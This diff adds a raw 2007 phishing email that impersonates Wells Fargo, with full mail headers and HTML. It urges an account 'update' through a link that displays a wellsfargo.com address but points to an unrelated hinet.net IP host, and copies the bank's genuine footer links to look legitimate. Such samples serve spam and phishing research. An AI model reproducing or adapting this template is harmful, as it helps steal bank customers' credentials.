@@ -1,0 +1,99 @@
+Return-Path: <root@blogrevo.local>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id B6D2A4691C
+	for <user@login.example.com>; Sun, 17 Jun 2007 07:11:52 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by mail.example.org (Postfix) with ESMTP id B2DD4131FB9A
+	for <user@example.com>; Sun, 17 Jun 2007 07:11:52 -0400 (EDT)
+Received: from blogrevo (mail.blogrevo.com [202.142.212.8])
+	by mail.example.org (Postfix) with ESMTP id 22FE06FA1C4
+	for <user@example.com>; Sun, 17 Jun 2007 07:11:52 -0400 (EDT)
+Received: by blogrevo (Postfix, from userid 0)
+	id 2B7841717382; Sun, 17 Jun 2007 16:50:12 +0700 (ICT)
+To: user@example.com
+Subject: Your Wells Fargo account information needs to be updated
+From: Wells Fargo <alertig@email-wellsfargo.com>
+Content-Type: text/html
+Message-Id: <20070617102401.2B7841717382@blogrevo>
+Date: Sun, 17 Jun 2007 16:50:12 +0700 (ICT)
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 1407
+
+
+<head>
+<style type="text/css">#tabNav ul {margin-bottom:-4px}</style>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<title>New Page 1</title>
+</head>
+<body>
+<table cellSpacing="0" cellPadding="0" width="504" border="0" height="337"> 
+<tbody>
+<tr>
+<td vAlign="top" align="left" width="507" height="65">
+<img src=" https://a248.e.akamai.net/7/248/1856/90m/www.wellsfargo.com/img/hp/logo_62sq.gif" alt="Wells Fargo" id="logo0" width="62" height="62"><img src=" https://a248.e.akamai.net/7/248/1856/90m/www.wellsfargo.com/img/hp/stagecoach.jpg" alt id="stagecoach0" width="232" height="62"></td>
+<td vAlign="top" align="left" height="65" width="93"> 
+ </td>
+</tr>
+<tr>
+<td colSpan="2" height="272" width="602"><font face="Verdana" size="2"><strong>Dear
+valued Wells Fargo member:</strong></font> 
+<p align="left"><font face="Verdana" size="2">Due to concerns, for the
+safety and integrity of the Wells Fargo<br>
+account we have issued this warning message.</font></p> 
+<p align="left"><font face="Verdana" size="2">It has come to our attention that your
+Wells Fargo account information needs to be<br>
+updated as part of our continuing commitment to protect your account and 
+to<br>
+reduce the instance of fraud on our website. If you could please take
+5-10 minutes<br>
+out of your online experience and update your personal records you will
+not run into<br>
+any future problems with the online service.</font></p> 
+<p align="left"><font face="Verdana" size="2">Once you have updated your account
+records your wells Fargo account<br>
+service will not be interrupted and will continue as normal.</font></p> 
+<p align="left"><font face="Verdana" size="2">To update your Wells Fargo records click
+on the following link:</font></p>
+<p align="left"><b> 
+<a target="_blank" rel="nofollow" href=" http://60-250-77-92.hinet-ip.hinet.net/user/wellsfargo.com/wellsfargo/Updates_info/index.html">http://wellsfargo.com/Updates_info/index.html</a></b></p></font>
+<p><font face="Verdana" size="2">Thank You.</font></p> 
+<div id="footer" align="center" style="width: 593; height: 103">
+  <p id="footerNav"><a href=" https://www.wellsfargo.com/about/about ">
+  <font size="1" color="#003399">About Wells Fargo</font></a><font size="1"><font color="#003399"> 
+  | </font><a href=" https://www.wellsfargo.com/careers/"><font color="#003399">
+  Careers</font></a><font color="#003399"> | </font> 
+  <a href="https://www.wellsfargo.com/privacy_security/"><font color="#003399"> 
+  PRIVACY, Security & Legal</font></a><font color="#003399"> | </font> 
+  <a href="https://www.wellsfargo.com/privacy_security/fraud/report/fraud ">
+  <font color="#003399">Report Email Fraud</font></a><font color="#003399"> | 
+  </font><a href="https://www.wellsfargo.com/sitemap"><font color="#003399"> 
+  Sitemap</font></a><font color="#003399"><br> 
+  </font><a href="https://www.wellsfargo.com/about/diversity/">
+  <font color="#003399">Diversity & Accessibility</font></a><font color="#003399"> 
+  | </font>
+  <a href="https://www.wellsfargo.com/online_brokerage/education/trading/volatile/ ">
+  <font color="#003399">Important Notice on Trading in Fast Markets</font></a><font color="#003399"> 
+  | </font></font>
+  <a href="https://online.wellsfargo.com/common/html/wibdisc.html ">
+  <font size="1" color="#003399">Online Access Agreement (12/05/2006)</font></a></p> 
+  <p class="notnot"><strong><font size="1">Brokerage Products: Not FDIC Insured 
+  • No Bank Guarantee • May Lose Value.</font></strong></p>
+  <p class="notnot"><font size="1">© 1999 - 2007 Wells Fargo. All rights 
+  reserved. Member FDIC.
+  <img src=" https://a248.e.akamai.net/7/248/1856/90m/www.wellsfargo.com/img/hp/al_ehl_house_gen.gif " alt style="padding: 0pt 5px 0pt 15px;" width="14" height="10"></font><strong style="color: rgb(0, 0, 0);"><font size="1">Equal 
+  Housing Lender</font></strong></p> 
+  </div>
+</font>
+</td>
+</tr>
+</tbody>
+</table>
+</body>
+</html>
+
